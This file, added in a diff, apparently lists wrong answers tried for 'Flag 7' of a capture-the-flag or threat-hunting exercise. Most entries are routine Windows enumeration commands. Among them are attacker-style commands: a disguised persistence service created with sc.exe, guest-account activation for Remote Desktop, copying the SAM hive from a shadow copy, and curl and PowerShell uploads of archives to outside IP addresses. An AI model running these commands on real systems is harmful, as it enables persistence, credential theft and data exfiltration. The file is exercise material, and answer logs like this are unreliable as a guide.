@@ -1,0 +1,213 @@
+# flag7_wrong_answers.txt
+# Generated from conversation — list of all candidate command-lines tried and marked incorrect for Flag 7.
+# One entry per line (deduplicated where obvious).
+
+"C:\Windows\System32\cmd.exe" /c whoami
+C:\Windows\System32\cmd.exe /c whoami
+whoami.exe
+"whoami.exe"
+C:\Windows\System32\whoami.exe
+"C:\Windows\System32\whoami.exe"
+C:\Windows\System32\whoami.exe /all
+"C:\Windows\System32\whoami.exe" /all
+whoami /all
+"whoami /all"
+whoami.exe /all
+"whoami.exe" /all
+C:\Windows\System32\whoami.exe /priv
+whoami /priv
+whoami.exe /priv
+"whoami.exe" /priv
+
+powershell.exe "whoami.exe" /all
+powershell.exe "whoami.exe" /priv
+powershell.exe -> whoami /all
+powershell.exe -> whoami /priv
+powershell.exe -> whoami.exe
+appmanager.exe -> whoami.exe
+"appmanager.exe" -ExecutionPolicy Bypass -File C:\Users\Public\update_check.ps1 -> whoami.exe
+officeservice.exe -> whoami.exe
+mssync.exe -> whoami.exe
+msupdate.exe -> whoami.exe
+msupdate.exe -> C:\Windows\System32\whoami.exe
+msupdate.exe -ExecutionPolicy Bypass -File C:\Users\Public\update_check.ps1 -> whoami.exe
+
+systeminfo
+systeminfo.exe
+C:\Windows\System32\systeminfo.exe
+"C:\Windows\System32\systeminfo.exe"
+"C:\Windows\System32\cmd.exe" /c systeminfo
+C:\Windows\System32\cmd.exe /c systeminfo
+C:\Windows\System32\cmd.exe /C "systeminfo"
+C:\Windows\System32\cmd.exe /c "systeminfo"
+"C:\Windows\System32\cmd.exe" /c "systeminfo"
+"C:\Windows\System32\cmd.exe" /C systeminfo
+C:\Windows\SysWOW64\systeminfo.exe
+
+hostname
+hostname.exe
+C:\Windows\System32\hostname.exe
+"C:\Windows\System32\hostname.exe"
+cmd.exe /c hostname
+C:\Windows\System32\cmd.exe /c hostname
+"C:\Windows\System32\rundll32.exe" C:\Windows\system32\migration\WininetPlugin.dll,MigrateCacheForUser /m /0
+RunDll32.exe C:\Windows\system32\migration\WininetPlugin.dll,MigrateCacheForUser /m /0
+rundll32.exe AppXDeploymentExtensions.OneCore.dll,ShellRefresh
+"C:\Windows\System32\rundll32.exe" AppXDeploymentExtensions.OneCore.dll,ShellRefresh
+rundll32.exe shell32.dll,SHCreateLocalServerRunDll {GUID} -Embedding
+rundll32.exe C:\Windows\System32\shell32.dll,SHCreateLocalServerRunDll {9aa46009-3ce0-458a-a354-715610a075e6} -Embedding
+rundll32.exe C:\Windows\system32\PcaSvc.dll,PcaWallpaperAppDetect
+
+net user
+"net user"
+C:\Windows\System32\cmd.exe /c "net user"
+C:\Windows\System32\cmd.exe /c net user
+net.exe user
+C:\Windows\System32\net.exe user
+net1 user
+net1.exe user
+C:\Windows\System32\net1.exe user administrator
+C:\Windows\System32\net.exe user administrator
+net.exe user administrator
+"C:\Windows\System32\net.exe" user administrator
+net1.exe user administrator
+"C:\Windows\System32\net1.exe" user administrator
+net.exe user guest
+net1.exe user guest
+net.exe user guest /active:yes
+net1.exe user guest /active:yes
+net.exe localgroup "Remote Desktop Users" guest /add
+net1.exe localgroup "Remote Desktop Users" guest /add
+net localgroup administrators
+net1 localgroup administrators
+"C:\Windows\System32\cmd.exe" /c "net localgroup administrators"
+
+query user
+quser.exe
+C:\Windows\System32\query.exe
+C:\Windows\System32\cmd.exe /c query user
+C:\Windows\System32\cmd.exe /c quser
+C:\Windows\System32\query.exe user
+C:\Windows\System32\quser.exe
+query user
+quser.exe
+
+ipconfig /all
+C:\Windows\System32\ipconfig.exe /all
+C:\Windows\System32\cmd.exe /c "C:\Windows\System32\ipconfig.exe /all"
+"C:\Windows\System32\cmd.exe" /c "ipconfig /all"
+C:\Windows\System32\cmd.exe /c "ipconfig /all"
+powershell.exe -Command "ipconfig /all"
+powershell.exe -NoProfile -Command "& 'C:\Windows\System32\ipconfig.exe' /all"
+C:\Windows\SysWOW64\ipconfig.exe /all
+ipconfig.exe /all
+
+netstat -ano
+C:\Windows\System32\netstat.exe -ano
+"C:\Windows\System32\netstat.exe" -ano
+C:\Windows\System32\cmd.exe /c "C:\Windows\System32\netstat.exe -ano"
+"C:\Windows\System32\cmd.exe" /c "netstat -ano"
+C:\Windows\System32\NETSTAT.EXE -ano
+netstat  -ano
+netstat   -ano
+NETSTAT.EXE -ano
+netstat -an
+C:\Windows\System32\netstat.exe -an
+netstat -an
+
+tasklist /svc
+tasklist.exe /svc
+C:\Windows\System32\tasklist.exe /svc
+C:\Windows\System32\cmd.exe /c "tasklist /svc"
+tasklist /fo list
+C:\Windows\System32\cmd.exe /c tasklist /fo list
+C:\Windows\System32\cmd.exe /c tasklist /svc
+
+wmic computersystem get domain
+wmic computersystem get name
+wmic os get caption
+C:\Windows\System32\wbem\WMIC.exe os get caption
+C:\Windows\System32\wbem\WMIC.exe computersystem get domain
+WMIC.exe shadowcopy call create Volume=C:\
+
+nslookup localhost
+C:\Windows\System32\nslookup.exe localhost
+nslookup localhost
+
+reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion
+C:\Windows\System32\cmd.exe /c reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion
+
+ver
+cmd.exe /c ver
+C:\Windows\System32\cmd.exe /c ver
+cmd.exe /c "ver"
+"cmd.exe" /c "ver"
+
+netsh firewall show state
+C:\Windows\System32\cmd.exe /c netsh firewall show state
+C:\Windows\System32\cmd.exe /c netsh advfirewall firewall show rule name=all
+C:\Windows\System32\netsh.exe firewall show state
+C:\Windows\System32\netsh.exe advfirewall firewall show rule name=all
+
+PowerShell enumeration variants:
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Get-ComputerInfo
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe whoami
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Get-WmiObject Win32_ComputerSystem
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Get-CimInstance Win32_ComputerSystem
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Get-Process
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Get-Service
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Get-LocalUser
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Get-LocalGroup
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Get-NetIPConfiguration"
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Get-NetIPAddress"
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Get-NetAdapter"
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Get-NetRoute"
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Get-NetTCPConnection"
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Get-WmiObject Win32_NetworkAdapterConfiguration"
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Get-NetNeighbor"
+
+rundll32 / dllhost / conhost variants seen:
+rundll32.exe shell32.dll,ShellExec_RunDLL whoami
+rundll32.exe shell32.dll,ShellExec_RunDLL hostname
+rundll32.exe shell32.dll,ShellExec_RunDLL systeminfo
+rundll32.exe shell32.dll,SHCreateLocalServerRunDll {GUID} -Embedding
+rundll32.exe C:\Windows\system32\PcaSvc.dll,PcaWallpaperAppDetect
+rundll32.exe Startupscan.dll,SusRunTask
+DllHost.exe /Processid:{GUID}
+DllHost.exe /Processid:{338B40F9-9D68-4B53-A793-6B9AA0C5F63B}
+DllHost.exe variants
+conhost.exe 0xffffffff -ForceV1
+conhost.exe 0xffffffff -ForceV1,msupdate.exe
+
+service creation / sc.exe variations used in attempts:
+"cmd.exe" /c "sc.exe create \"MSUpdateService\" binPath= \"powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\Microsoft\Windows\Update\mscloudsync.ps1\" DisplayName= \"Microsoft Update Service\" start= auto"
+sc.exe  create "MSUpdateService" binPath= "powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\Microsoft\Windows\Update\mscloudsync.ps1" DisplayName= "Microsoft Update Service" start= auto
+cmd.exe /c sc.exe create "SysHelperService" binPath= "powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\Microsoft\Windows\Update\mscloudsync.ps1" DisplayName= "Microsoft Update Service" start= auto
+cmd.exe /c sc.exe create "NetUpdateService" binPath= "powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\Microsoft\Windows\Update\mscloudsync.ps1" DisplayName= "Microsoft Update Service" start= auto
+cmd.exe /c sc.exe description "MSUpdateService" "Provides automated Microsoft product updates and synchronization"
+sc.exe  description "MSUpdateService" "Provides automated Microsoft product updates and synchronization"
+sc.exe  delete MSUpdateService
+sc.exe delete MSUpdateService
+
+other misc tried commands / patterns:
+cmd.exe /c calc.exe
+C:\Windows\System32\cmd.exe /c calc.exe
+calc.exe
+cmd.exe /q /c del /q "C:\Users\misawa\AppData\Local\Temp\..."
+cmd.exe /q /c del /q "C:\Users\misawa\AppData\Local\Microsoft\OneDrive\Update\OneDriveSetup.exe"
+cmd.exe /q /c rmdir /s /q "C:\Users\misawa\AppData\Local\Microsoft\OneDrive\25.085.0504.0002"
+cmd.exe /c copy /y "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM" C:\Temp\SAM.hiv
+WMIC.exe shadowcopy call create Volume=C:\
+cmd  /c copy /y "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM"    C:\Temp\SAM.hiv
+cmd  /c copy /y "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy6\Windows\System32\config\SAM"    C:\Temp\SAM.hiv
+cmd.exe /c "ver"
+python.exe -m pip install --upgrade pip
+python.exe -m pip install magic-wormhole magic-wormhole-transit-relay
+python.exe -W ignore::DeprecationWarning -c "...pip install..."
+curl -X POST -F "file=@C:\Users\SLFlare\AppData\Local\Temp\backup_sync.zip" http://185.92.220.87:8081/upload
+powershell -Command "Invoke-WebRequest -Uri 'http://185.92.220.87:8081/api/upload' -Method POST -InFile 'C:\Users\SLFlare\AppData\Local\Temp\backup_sync.zip'"
+powershell -Command "Invoke-WebRequest -Uri 'http://185.92.220.87:8081/api/upload' -Method POST -InFile 'C:\Users\misawa\AppData\Local\Temp\archive.7z'"
+powershell -Command "Invoke-WebRequest -Uri 'http://203.0.113.151.225:8083/api/upload' -Method POST -InFile 'C:\Users\misawa\AppData\Local\Temp\sync.7z'"
+powershell -Command "Invoke-WebRequest -Uri 'http://10.0.178.157:8096/api/upload' -Method POST -InFile 'C:\Users\misawa\AppData\Local\Temp\export.zip'"
+
+# End of list
